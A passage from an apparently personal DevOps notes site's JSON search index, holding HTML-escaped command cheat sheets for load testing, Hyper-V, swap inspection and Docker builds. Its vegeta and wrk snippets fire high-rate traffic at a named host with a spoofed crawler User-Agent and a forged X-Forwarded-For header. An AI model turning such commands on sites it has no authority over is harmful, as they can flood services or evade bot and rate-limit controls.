style=\"color:#e6db74\"\u003e\u0026#34;User-Agent: baidu\u0026#34;\u003c/span\u003e -header\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;X-Forwarded-For: 47.0.0.1\u0026#34;\u003c/span\u003e -rate\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e500\u003c/span\u003e -timeout\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e1s |\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        vegeta encode |\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        jaggr @count\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003erps \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e            hist\u003cspan style=\"color:#ae81ff\"\u003e\\[\u003c/span\u003e100,200,300,400,500\u003cspan style=\"color:#ae81ff\"\u003e\\]\u003c/span\u003e:code \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e            p25,p50,p95:latency \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e            sum:bytes_in \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e            sum:bytes_out |\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        jplot rps+code.hist.100+code.hist.200+code.hist.300+code.hist.400+code.hist.500 \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e            latency.p95+latency.p50+latency.p25 \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e            bytes_in.sum+bytes_out.sum\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[[\u003c/span\u003e -n \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003e1\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e]]\u003c/span\u003e; \u003cspan style=\"color:#66d9ef\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    attack \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003e1\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## -header=\u0026#34;Connection: Upgrade\u0026#34; -header=\u0026#34;Upgrade: websocket\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ewrk\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewrk -t10 -c1000 -d30s -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;User-Agent: baidu\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;https://default.hddv1.com/error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eVagrant with hyper-v provider\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eEnable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eCommon\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Find out processes swap usage command\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e file in /proc/*/status ; \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/VmSwap|Name/{printf $2 \u0026#34; \u0026#34; $3}END{ print \u0026#34;\u0026#34;}\u0026#39;\u003c/span\u003e $file; \u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e | sort -k \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e -n -r | less\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eGitbook\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cp\u003eHide gitbook sidebar default.\u003c/p\u003e","tags":null,"title":"Common Command"},{"categories":null,"contents":" Diagrams https://diagrams.mingrammer.com/docs/getting-started/installation ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/docs/diagrams/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eDiagrams\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ca href=\"https://diagrams.mingrammer.com/docs/getting-started/installation\" target=\"_blank\" rel=\"noopener\"\u003ehttps://diagrams.mingrammer.com/docs/getting-started/installation\u003c/a\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Diagrams"},{"categories":null,"contents":" Build with secret Dockerfile # syntax = docker/dockerfile:1.6 FROM golang:1.21.1-alpine3.18 RUN --mount=type=secret,id=mysecret,target=/root/.ssh/id_rsa git clone git@gitlab.com:ricky/repo.git Command export DOCKER_BUILDKIT=1 docker build --secret id=mysecret,src=id_rsa -t image . Compose # Force pull image docker-compose up -d --pull always Create buildx instance # create buildx instance docker buildx create --name builder --bootstrap --driver docker-container # install emulators docker run --privileged --rm tonistiigi/binfmt --install all Create Network docker network create -d bridge --subnet 172.100.0.0/24 --gateway 172.100.0.1 backend_dev Multiple build-arg docker build . -f ./scripts/Dockerfile \\ --build-arg Date=$(date) \\ --build-arg Tag=$(git rev-list -n 1 --tags) \\ --build-arg Commit=$(git describe --tags --abbrev=0) \\ -t ops-cli Multiple platform # create and use buildx instance docker buildx create --use --name builder # build multiple platform docker buildx build --push --platform linux/arm64,linux/amd64 -t zeyanlin/ops-cli . Run container in different platform finch run -it --rm --platform=linux/arm64 zeyanlin/ops-cli /bin/sh ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/bash/docker/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eBuild with secret\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cul\u003e\n\u003cli\u003eDockerfile\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-dockerfile\" data-lang=\"dockerfile\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# syntax = docker/dockerfile:1.6\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eFROM\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e golang:1.21.1-alpine3.18\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eRUN\u003c/span\u003e --mount\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003etype\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003esecret,id\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003emysecret,target\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/root/.ssh/id_rsa git clone git@gitlab.com:ricky/repo.git\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eCommand\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eexport DOCKER_BUILDKIT\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker build --secret id\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003emysecret,src\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eid_rsa -t image .\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eCompose\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Force pull image\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker-compose up -d --pull always\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eCreate buildx instance\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# create buildx instance\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker buildx create --name builder --bootstrap --driver docker-container\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# install emulators\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker run --privileged --rm tonistiigi/binfmt --install all\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eCreate Network\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker network create -d bridge --subnet 172.100.0.0/24 --gateway 172.100.0.1 backend_dev\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eMultiple build-arg\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker build . -f ./scripts/Dockerfile \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --build-arg Date\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003edate\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --build-arg Tag\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003egit rev-list -n \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e --tags\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --build-arg Commit\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003egit describe --tags --abbrev\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e0\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  -t ops-cli\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eMultiple platform\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# create and use buildx instance\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker buildx create --use --name builder\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# build multiple platform\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker buildx build --push --platform linux/arm64,linux/amd64 -t zeyanlin/ops-cli .\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eRun container in different platform\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efinch run -it --rm --platform\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003elinux/arm64 zeyanlin/ops-cli /bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Docker Command"},{"categories":null,"contents":" docker-compose cAdvisor docker-compose.yaml prometheus.yaml Elasticsearch docker-compose.yaml local dev docker-compose.yaml NodeJS docker-compose.yaml rstudio docker-compose.yaml rsyncd docker-compose.yaml rsyncd.conf rsyncd.secrets rsync -auz --password-file=/tmp/pass dist user@hostip::myshare Dockerfile awscli Dockerfile buildx Dockerfile docker buildx build --push --platform linux/arm64,linux/amd64 -t zeyanlin/app . dind Dockerfile golang Dockerfile docker build --secret id=mysecret,src=id_rsa -t app . goproxy Dockerfile docker buildx build -f goproxy/Dockerfile --platform linux/amd64,linux/arm64 -t zeyanlin/goproxy:latest --push . Gitlab-ci Dockerfile telegram.bash nginx Dockerfile docker-compose.yml nginx.conf rstudio Dockerfile pkg.txt supervisord Dockerfile supervisord.conf service with supervisord Dockerfile ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/docs/docker/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003edocker-compose\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch5 id=\"cadvisor\"\u003ecAdvisor\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/docker-compose/cadvisor/docker-compose.yaml\"\u003edocker-compose.yaml\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/docker-compose/cadvisor/prometheus.yaml\"\u003eprometheus.yaml\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"elasticsearch\"\u003eElasticsearch\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/docker-compose/elasticsearch/docker-compose.yaml\"\u003edocker-compose.yaml\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"local-dev\"\u003elocal dev\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/docker-compose/local/docker-compose.yaml\"\u003edocker-compose.yaml\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"nodejs\"\u003eNodeJS\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/docker-compose/nodejs/docker-compose.yaml\"\u003edocker-compose.yaml\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"rstudio\"\u003erstudio\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/rstudio/docker-compose.yaml\"\u003edocker-compose.yaml\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"rsyncd\"\u003ersyncd\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/docker-compose/rsyncd/docker-compose.yaml\"\u003edocker-compose.yaml\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/docker-compose/rsyncd/rsyncd.conf\"\u003ersyncd.conf\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/docker-compose/rsyncd/rsyncd.secrets\"\u003ersyncd.secrets\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ersync -auz --password-file=/tmp/pass dist user@hostip::myshare\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eDockerfile\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch5 id=\"awscli\"\u003eawscli\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/awscli/Dockerfile\"\u003eDockerfile\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"buildx\"\u003ebuildx\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/buildx/Dockerfile\"\u003eDockerfile\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003edocker buildx build --push --platform linux/arm64,linux/amd64 -t zeyanlin/app .\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"dind\"\u003edind\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/dind/Dockerfile\"\u003eDockerfile\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"golang\"\u003egolang\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/golang/Dockerfile\"\u003eDockerfile\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003edocker build --secret id=mysecret,src=id_rsa -t app .\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"goproxy\"\u003egoproxy\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/goproxy/Dockerfile\"\u003eDockerfile\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003edocker buildx build -f goproxy/Dockerfile --platform linux/amd64,linux/arm64 -t zeyanlin/goproxy:latest --push .\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"gitlab-ci\"\u003eGitlab-ci\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/gitlab/Dockerfile\"\u003eDockerfile\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/gitlab/telegram.bash\"\u003etelegram.bash\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"nginx\"\u003e\u003ca href=\"https://github.com/macbre/docker-nginx-http3\" target=\"_blank\" rel=\"noopener\"\u003enginx\u003c/a\u003e\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/nginx/Dockerfile\"\u003eDockerfile\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/nginx/docker-compose.yml\"\u003edocker-compose.yml\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/nginx/nginx.conf\"\u003enginx.conf\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"rstudio\"\u003erstudio\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/rstudio/Dockerfile\"\u003eDockerfile\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/rstudio/pkg.txt\"\u003epkg.txt\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"supervisord\"\u003esupervisord\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/supervisord/Dockerfile\"\u003eDockerfile\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca 